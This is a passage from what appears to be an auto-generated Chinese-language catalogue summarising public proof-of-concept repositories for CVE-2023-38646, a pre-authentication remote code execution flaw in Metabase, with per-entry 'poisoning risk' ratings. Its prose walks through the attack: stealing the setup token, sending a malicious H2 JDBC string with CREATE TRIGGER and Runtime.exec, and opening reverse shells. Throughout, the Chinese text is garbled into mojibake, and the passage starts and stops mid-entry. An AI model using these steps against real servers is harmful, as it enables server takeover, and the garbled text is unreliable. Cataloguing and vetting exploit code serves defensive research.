åˆ›å»ºä¸€ä¸ªJavaå‡½æ•°,ä»è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚\n\n**åˆ©ç”¨æ–¹å¼ï¼š**\n1. **è·å– Setup Token:**  é€šè¿‡è®¿é—® `/api/session/properties` è·å–åˆå§‹è®¾ç½®æ‰€éœ€çš„ tokenã€‚\n2. **è®¾ç½®ç®¡ç†å‘˜è´¦æˆ·:**  ä½¿ç”¨è·å–çš„ tokenï¼Œè°ƒç”¨ `/api/setup` åˆ›å»ºä¸€ä¸ªæ–°çš„ç®¡ç†å‘˜è´¦æˆ·ã€‚è¿™å°†åˆ›å»ºä¸€ä¸ªå…·æœ‰å¿…è¦æƒé™çš„ä¼šè¯ã€‚\n3. **æ·»åŠ æ¶æ„æ•°æ®åº“è¿æ¥:** ä½¿ç”¨æ–°åˆ›å»ºçš„ç®¡ç†å‘˜ä¼šè¯ï¼Œè°ƒç”¨ `/api/database` API æ·»åŠ ä¸€ä¸ªæ–°çš„æ•°æ®åº“ã€‚å…³é”®åœ¨äºæ„é€ æ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²ï¼Œåˆ©ç”¨ `INIT` å‚æ•°æ‰§è¡Œè¿œç¨‹ SQL è„šæœ¬ï¼Œè¯¥è„šæœ¬å®šä¹‰äº†ä¸€ä¸ª Java å‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ä¸ºäº†ç»•è¿‡æŸäº›é™åˆ¶ï¼Œé€šå¸¸åˆ©ç”¨ `CREATE ALIAS` åˆ›å»ºJavaå‡½æ•°,ä»è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚\n\n**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„ PoC ä»£ç æ˜¯æœ‰æ•ˆçš„ï¼Œå®ƒèƒ½å¤Ÿåˆ©ç”¨è¯¥æ¼æ´åœ¨ Metabase å®ä¾‹ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œå¦‚æœç›®æ ‡å®ä¾‹çš„ç‰ˆæœ¬ä½äºå—å½±å“çš„ç‰ˆæœ¬ã€‚\n\n**æŠ•æ¯’é£é™©ï¼š** é£é™©ä¸º10%ï¼Œä¸»è¦é£é™©åœ¨äº `exploit.py` æ–‡ä»¶ä¸­`YOUR_GITPOD_WORKSPACE_URL` å¦‚æœä¸æ˜¯æ”»å‡»è€…è‡ªå·±çš„æœåŠ¡å™¨ï¼Œå­˜åœ¨è¢«ä¸­é—´äººæ”»å‡»æ›¿æ¢è¿æ¥çš„é£é™©. è™½ç„¶`poc.sql`ç›®å‰ä»…ä»…æ˜¯ `SELECT 1;`ï¼Œ ä½†æ˜¯å¦‚æœæœ‰äººæ¶æ„ä¿®æ”¹`poc.sql`ï¼Œåˆ™å­˜åœ¨è¢«æŠ•æ¯’é£é™©ã€‚ start.shä¸­çš„metabase.jaræ¥æºå¯èƒ½è¢«ç¯¡æ”¹ï¼Œå­˜åœ¨è¢«æŠ•æ¯’é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [BreezeGalaxy/CVE-2023-38646](https://github.com/BreezeGalaxy/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #5

**æ¥æº**: [CVE-2023-38646-CN016_Metabase-H2-CVE-2023-38646-.md](../2023/CVE-2023-38646-CN016_Metabase-H2-CVE-2023-38646-.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** MetabaseæœåŠ¡éœ€è¦å¯è®¿é—®ï¼Œæ— éœ€è®¤è¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´å­˜åœ¨äºMetabaseçš„setupæµç¨‹ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„JDBC URLæ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§:**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š
1.  è·å–setup-tokenï¼šPOCé¦–å…ˆå°è¯•ä»`/api/session/properties`è·å–setup-tokenã€‚è¿™æ˜¯åˆ©ç”¨æ¼æ´çš„å‰æã€‚ä»æ¼æ´ä¿¡æ¯æ¥çœ‹ï¼Œè¿™ä¸ªæ¥å£ä¸éœ€è¦èº«ä»½éªŒè¯ã€‚
2.  æ„é€ Payloadï¼šPOCæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JDBC URLçš„JSON payloadã€‚è¯¥URLåˆ©ç”¨H2æ•°æ®åº“çš„`CREATE TRIGGER`åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å‘½ä»¤çš„æ‰§è¡Œæ˜¯é€šè¿‡è°ƒç”¨`java.lang.Runtime.getRuntime().exec()`å®ç°çš„ã€‚POCä¸­é»˜è®¤æ‰§è¡Œ`touch /tmp/success`ï¼Œè¿™æ˜¯ä¸€ä¸ªæ— å®³çš„å‘½ä»¤ï¼Œç”¨äºéªŒè¯æ¼æ´çš„å­˜åœ¨ã€‚
3.  å‘é€Payloadï¼šPOCå°†æ„é€ çš„payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚å¦‚æœæœåŠ¡å™¨è¿”å›åŒ…å«"Error creating or initializing trigger"çš„å“åº”ï¼Œåˆ™è¡¨æ˜æ¼æ´åˆ©ç”¨æˆåŠŸã€‚

**æŠ•æ¯’é£é™©:**
è™½ç„¶POCçš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ã€‚ä»¥ä¸‹æ˜¯åˆ†æï¼š
1. **`custom_base64_encode`å‡½æ•°:** è¿™ä¸ªå‡½æ•°å­˜åœ¨è¢«æ»¥ç”¨çš„å¯èƒ½ã€‚è™½ç„¶å…¶ç›®çš„æ˜¯å¯¹å‘½ä»¤è¿›è¡Œç¼–ç ï¼Œä½†å¦‚æœç”¨äºç¼–ç æ¶æ„è„šæœ¬å¹¶æ‰§è¡Œï¼Œåˆ™ä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜ã€‚
2. **å‘½ä»¤æ‰§è¡Œ:** POCä¸­ä½¿ç”¨`java.lang.Runtime.getRuntime().exec()`æ‰§è¡Œå‘½ä»¤ã€‚è¿™æœ¬èº«å°±å¾ˆå±é™©ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»ä½•å‘½ä»¤ï¼ŒåŒ…æ‹¬ä¸‹è½½å’Œæ‰§è¡Œæ¶æ„è„šæœ¬ã€‚
3. **é»˜è®¤å‘½ä»¤:** è™½ç„¶POCé»˜è®¤æ‰§è¡Œçš„æ˜¯`touch /tmp/success`ï¼Œä½†æ”»å‡»è€…å¯ä»¥å¾ˆå®¹æ˜“åœ°ä¿®æ”¹`-c`å‚æ•°æ¥æ‰§è¡Œä»»ä½•å…¶ä»–å‘½ä»¤ã€‚å¦‚æœPOCè¢«åˆ†å‘å¹¶è¢«ç¼ºä¹ç»éªŒçš„ç”¨æˆ·ä½¿ç”¨ï¼Œä»–ä»¬å¯èƒ½ä¼šç›´æ¥æ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„å‘½ä»¤ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©ä¸»è¦åœ¨äºä½¿ç”¨è€…å¯èƒ½å—åˆ°æ¶æ„å‘½ä»¤çš„å½±å“ã€‚`custom_base64_encode`å‡½æ•°å’Œå‘½ä»¤æ‰§è¡Œæœºåˆ¶ä¹Ÿä¸ºæ½œåœ¨çš„æ¶æ„è¡Œä¸ºæä¾›äº†å¯èƒ½æ€§ã€‚é£é™©è¯„ä¼°ä¸º 10%ï¼Œä¸»è¦æ¥æºäºä½¿ç”¨è€…æ²¡æœ‰å®‰å…¨æ„è¯†ï¼Œç›´æ¥æ‰§è¡Œäº†æ¶æ„å‘½ä»¤ï¼Œæˆ–è€…ä»£ç åº“çš„ä¸‹è½½æºè¢«æ›¿æ¢ã€‚

**åˆ©ç”¨æ–¹å¼:**
1.  æ”»å‡»è€…é¦–å…ˆå‘`/api/session/properties`å‘é€GETè¯·æ±‚ä»¥è·å–setup-tokenã€‚
2.  ç„¶åï¼Œæ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JDBC URLçš„JSON payloadã€‚æ¶æ„JDBC URLåˆ©ç”¨H2æ•°æ®åº“çš„`CREATE TRIGGER`åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºä¸€ä¸ªåœ¨`INFORMATION_SCHEMA.TABLES`ä¸Šè§¦å‘çš„triggerï¼Œå¹¶åœ¨è§¦å‘æ—¶æ‰§è¡ŒJavaä»£ç ã€‚Javaä»£ç è°ƒç”¨`java.lang.Runtime.getRuntime().exec()`æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…å°†æ„é€ çš„payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚
4.  å¦‚æœæœåŠ¡å™¨æˆåŠŸåˆ›å»ºäº†triggerï¼Œåˆ™æ”»å‡»æˆåŠŸï¼Œæ”»å‡»è€…æ‰§è¡Œçš„å‘½ä»¤å°†åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [CN016/Metabase-H2-CVE-2023-38646-](https://github.com/CN016/Metabase-H2-CVE-2023-38646-)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #6

**æ¥æº**: [CVE-2023-38646-DaniTheHack3r_CVE-2023-38646.md](../2023/CVE-2023-38646-DaniTheHack3r_CVE-2023-38646.md)

## CVE-2023-38646 Metabase RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ç½‘ç»œè®¿é—®ï¼Œä¸”ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæ­¤æ¼æ´çš„ä¸¥é‡ç¨‹åº¦ä¸ºé«˜å±ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Token:** POCä»£ç é¦–å…ˆå°è¯•ä» `[TARGET_URL]/api/session/properties` è·å– setup-tokenã€‚
2.  **æ„é€  Payload:** åˆ©ç”¨è·å–åˆ°çš„tokenï¼ŒPOCæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ payloadã€‚è¯¥å­—ç¬¦ä¸²ä¸­åŒ…å«å¯æ‰§è¡Œå‘½ä»¤ï¼ˆé€šè¿‡ `COMMAND` å‚æ•°ä¼ å…¥ï¼‰ï¼Œé€šå¸¸é€šè¿‡ Base64 ç¼–ç è¿›è¡Œæ··æ·†ã€‚
3.  **å‘é€ Payload:** æ„é€ å¥½çš„payloadä¼šè¢«å‘é€åˆ° Metabase æœåŠ¡å™¨ï¼Œåˆ©ç”¨å…¶å¯¹æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²å¤„ç†ä¸å½“çš„æ¼æ´ï¼Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚
4.  **å‘½ä»¤æ‰§è¡Œ:**  é€šè¿‡åˆ›å»ºè§¦å‘å™¨å’Œåˆ©ç”¨H2æ•°æ®åº“ç‰¹æ€§ï¼Œå®ç°åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´æè¿°ã€æœç´¢å¼•æ“ç»“æœï¼ˆä¾‹å¦‚ï¼Œ[https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646/](https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646/) ï¼‰å’ŒPOCä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§è¾ƒé«˜ã€‚å¤šä¸ªæ¥æºè¡¨æ˜ï¼Œè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

POCä»£ç ä¸­å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡Œå‘½ä»¤ï¼Œä½†ä»£ç ä¸­å­˜åœ¨ä»¥ä¸‹æ½œåœ¨çš„é£é™©ç‚¹ï¼š

*   **è‡ªå®šä¹‰ Base64 ç¼–ç :**  `CustomBase64Encode` å‡½æ•°ä½¿ç”¨è‡ªå®šä¹‰çš„ Base64 ç¼–ç æ–¹å¼ï¼Œè™½ç„¶ç›®çš„æ˜¯ä¸ºäº†ç¬¦åˆæ¼æ´åˆ©ç”¨çš„è¦æ±‚ï¼Œä½†ä¹Ÿå¯èƒ½è¢«ç”¨æ¥éšè—æ¶æ„ä»£ç ã€‚
*   **Payload æ„é€ :** Payloadçš„æ„é€ è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ï¼Œæ”»å‡»è€…å¯èƒ½åœ¨payloadä¸­åµŒå…¥é¢å¤–çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚ï¼Œåœ¨è¿æ¥å­—ç¬¦ä¸²ä¸­æ·»åŠ é¢å¤–çš„å‚æ•°ï¼Œä»¥ä¾¿åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚
*   **ä»£ç†è®¾ç½®:** æ¶æ„æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡ä»£ç†æœåŠ¡å™¨å‘èµ·æ”»å‡», ä»è€Œéšè—è‡ªå·±çš„èº«ä»½ä¿¡æ¯.

å°½ç®¡å¦‚æ­¤ï¼Œæ ¹æ®ä»£ç æœ¬èº«ï¼Œå¤§éƒ¨åˆ†ä»£ç æ˜¯ç”¨äºå®ç°æ¼æ´åˆ©ç”¨åŠŸèƒ½çš„ï¼ŒæŠ•æ¯’çš„å¯èƒ½æ€§ç›¸å¯¹è¾ƒä½ï¼Œä¼°è®¡åœ¨10%å·¦å³ã€‚éœ€è¦äººå·¥å®¡æ ¸Payloadæ„é€ éƒ¨åˆ†ã€‚


**é¡¹ç›®åœ°å€:** [DaniTheHack3r/CVE-2023-38646](https://github.com/DaniTheHack3r/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #7

**æ¥æº**: [CVE-2023-38646-Ego1stoo_CVE-2023-38646.md](../2023/CVE-2023-38646-Ego1stoo_CVE-2023-38646.md)

## CVE-2023-38646 Metabase Pre-Auth RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 å’Œ Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ Metabase å®ä¾‹éœ€è¦è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œå¹¶ä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®åˆ°è¯¥å®ä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´çš„åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **æ¼æ´åŸç†ï¼š** Metabase å­˜åœ¨ä¸€ä¸ªæœªæˆæƒçš„ `/api/setup/validate` æ¥å£ï¼Œè¯¥æ¥å£ç”¨äºåœ¨ Metabase é¦–æ¬¡è®¾ç½®æ—¶éªŒè¯æ•°æ®åº“è¿æ¥ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¥å£ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚
2.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   é¦–å…ˆï¼Œæ”»å‡»è€…è®¿é—® Metabase å®ä¾‹çš„æ ¹è·¯å¾„ï¼Œè·å– `setup-token`ã€‚è¿™ä¸ªtokenè¢«åµŒå…¥åœ¨HTMLå“åº”çš„JavaScriptä»£ç ä¸­ï¼Œç”¨äºåç»­çš„è®¾ç½®è¿‡ç¨‹ã€‚
    *   ç„¶åï¼Œæ”»å‡»è€…å‘ `/api/setup/validate` æ¥å£å‘é€ POST è¯·æ±‚ï¼Œè¯·æ±‚ä½“åŒ…å«ä¸€ä¸ªæ¶æ„çš„ JSON å¯¹è±¡ã€‚è¿™ä¸ª JSON å¯¹è±¡çš„ `details.details.db` å­—æ®µåŒ…å«ä¸€ä¸ªç‰¹åˆ¶çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¿™ä¸ªè¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥äº†æ¶æ„ä»£ç ï¼Œåˆ©ç”¨ H2 æ•°æ®åº“çš„ `TRACE_LEVEL_SYSTEM_OUT` å’Œ `CREATE TRIGGER` åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„çš„ shell å‘½ä»¤ã€‚
    *   POCä»£ç æ„é€ äº†ä¸€ä¸ªåå¼¹shellçš„payloadï¼Œå°†ç›®æ ‡æœºå™¨ä¸Šçš„è¾“å…¥è¾“å‡ºé‡å®šå‘åˆ°æ”»å‡»è€…æ§åˆ¶çš„æœºå™¨ä¸Šï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
3.  **æŠ•æ¯’é£é™©åˆ†æï¼š**
    è™½ç„¶æä¾›çš„ä»£ç ä¸»è¦æ˜¯ç”¨äºæ¼æ´åˆ©ç”¨ï¼Œä½†ä»å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚é£é™©ç‚¹ä¸»è¦å­˜åœ¨äº`CVE-2023-38646.py`è„šæœ¬ä¸­çš„`payload`å˜é‡ã€‚å½“å‰çš„`payload`ç”¨äºåˆ›å»ºä¸€ä¸ªåå‘shellè¿æ¥ï¼Œè™½ç„¶æœ¬èº«ä¸æ˜¯æ¶æ„ä»£ç ï¼Œä½†å¯èƒ½è¢«ä¿®æ”¹ä¸ºæ‰§è¡Œæ›´å…·ç ´åæ€§çš„æ“ä½œã€‚å¦å¤–ï¼Œä½œè€…æä¾›çš„githubé“¾æ¥ä¸­çš„å›¾ç‰‡å¯èƒ½æ˜¯ç»è¿‡ä¿®æ”¹çš„ã€‚
    æ€»ä½“è€Œè¨€ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†éœ€è¦ä»”ç»†å®¡æŸ¥ä»£ç ï¼Œç¡®ä¿å…¶æ²¡æœ‰è¢«ç¯¡æ”¹æˆ–æ·»åŠ æ¶æ„åŠŸèƒ½ã€‚


**é¡¹ç›®åœ°å€:** [Ego1stoo/CVE-2023-38646](https://github.com/Ego1stoo/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #8

**æ¥æº**: [CVE-2023-38646-JayRyz_CVE-2023-38646-PoC-Metabase.md](../2023/CVE-2023-38646-JayRyz_CVE-2023-38646-PoC-Metabase.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“ç‰ˆæœ¬ï¼Œä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæ­¤æ¼æ´å½±å“Metabaseå¼€æºç‰ˆæœ¬ä½äº0.46.6.1å’ŒMetabaseä¼ä¸šç‰ˆæœ¬ä½äº1.46.6.1ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Tokenï¼š** åˆ©ç”¨ PoC ä»£ç ä¸­çš„ `get_token` å‡½æ•°ï¼Œé€šè¿‡è®¿é—® `/api/session/properties` æ¥å£è·å– setup-tokenã€‚
2.  **æ„é€ æ¶æ„Payloadï¼š** åˆ©ç”¨è·å–çš„ setup-token, æ„é€ åŒ…å«æ¶æ„å‘½ä»¤çš„payloadã€‚PoC ä»£ç ä½¿ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥æ¶æ„ SQL è¯­å¥ï¼Œè¯¥è¯­å¥åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼ˆTRIGGERï¼‰ï¼Œåœ¨è§¦å‘å™¨ä¸­æ‰§è¡Œå‘½ä»¤ã€‚å‘½ä»¤ä½¿ç”¨äº†åå¼¹shellçš„æŠ€æœ¯ã€‚ é¦–å…ˆå°†è¦æ‰§è¡Œçš„shellå‘½ä»¤è¿›è¡Œbase64ç¼–ç , ç„¶ååˆ©ç”¨`java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œå‘½ä»¤ã€‚
3.  **å‘é€Exploitï¼š** é€šè¿‡ POST è¯·æ±‚å°†æ„é€ çš„ payload å‘é€åˆ° Metabase æœåŠ¡å™¨ã€‚
4.  **åå¼¹ Shellï¼š** æ”»å‡»è€…ä½¿ç”¨ `nc` ç›‘å¬æŒ‡å®šç«¯å£ï¼Œç­‰å¾…ç›®æ ‡æœåŠ¡å™¨æ‰§è¡Œå‘½ä»¤ååå¼¹ shellã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æä¾›çš„æ¼æ´ä¿¡æ¯å’ŒPoCä»£ç ï¼Œæ­¤æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´åº“ä¿¡æ¯æ˜ç¡®æŒ‡å‡ºæ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨æ­¤æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æœç´¢å¼•æ“ç»“æœä¸­ä¹ŸåŒ…å«å¤§é‡å…³äºæ­¤æ¼æ´çš„åˆ†æå’Œåˆ©ç”¨æ–‡ç« ï¼Œè¿›ä¸€æ­¥éªŒè¯äº†å…¶æœ‰æ•ˆæ€§ã€‚PoCä»£ç æä¾›äº†è‡ªåŠ¨åŒ–åˆ©ç”¨çš„è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„ PoC ä»£ç ä¸­å­˜åœ¨æ½œåœ¨çš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†ä»£ç ä¸­å¯èƒ½åŒ…å«ä»¥ä¸‹æ½œåœ¨é£é™©ï¼š

*   **åå¼¹ Shell åœ°å€ï¼š** PoC ä»£ç å…è®¸ç”¨æˆ·æŒ‡å®šåå¼¹ shell çš„ IP åœ°å€å’Œç«¯å£ï¼Œä½†å¦‚æœç”¨æˆ·ä¸å°å¿ƒä½¿ç”¨äº†æ”»å‡»è€…æ§åˆ¶çš„ IP åœ°å€å’Œç«¯å£ï¼Œå¯èƒ½ä¼šè¢«åå¼¹ shellï¼Œå¯¼è‡´è‡ªèº«ç³»ç»Ÿè¢«æ”»å‡»è€…æ§åˆ¶ã€‚
*   **å…¶ä»–æ¶æ„å‘½ä»¤ï¼š**  æ”»å‡»è€…å¯èƒ½ä¼šä¿®æ”¹ PoC ä»£ç ï¼Œæ·»åŠ é¢å¤–çš„æ¶æ„å‘½ä»¤ï¼Œä¾‹å¦‚åˆ é™¤æ–‡ä»¶ã€ä¿®æ”¹ç³»ç»Ÿé…ç½®ç­‰ã€‚ä»£ç ä¸­çš„`convert_command`å‡½æ•°å’Œ`create_payload`å‡½æ•°å¯ä»¥è¢«ä¿®æ”¹æ³¨å…¥æ¶æ„ä»£ç ã€‚
*   **ä¾èµ–é¡¹é£é™©ï¼š** è™½ç„¶PoCä»£ç ä¾èµ–çš„requestsåº“æœ¬èº«é£é™©è¾ƒä½ï¼Œä½†æ˜¯å¦‚æœæ”»å‡»è€…æä¾›ä¿®æ”¹è¿‡çš„poc,å¢åŠ å…¶ä»–æ¶æ„ä¾èµ–åº“, å¯èƒ½ä¼šå­˜åœ¨å®‰å…¨é£é™©ã€‚

ç»¼åˆåˆ†æï¼ŒæŠ•æ¯’é£é™©è¯„ä¼°ä¸º 10%ï¼Œä¸»è¦é£é™©é›†ä¸­åœ¨ç”¨æˆ·é”™è¯¯ä½¿ç”¨æˆ–æ¶æ„ä¿®æ”¹ PoC ä»£ç çš„å¯èƒ½æ€§ä¸Šã€‚

**é¡¹ç›®åœ°å€:** [JayRyz/CVE-2023-38646-PoC-Metabase](https://github.com/JayRyz/CVE-2023-38646-PoC-Metabase)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #9

**æ¥æº**: [CVE-2023-38646-Mrunalkaran_CVE-2023-38646.md](../2023/CVE-2023-38646-Mrunalkaran_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

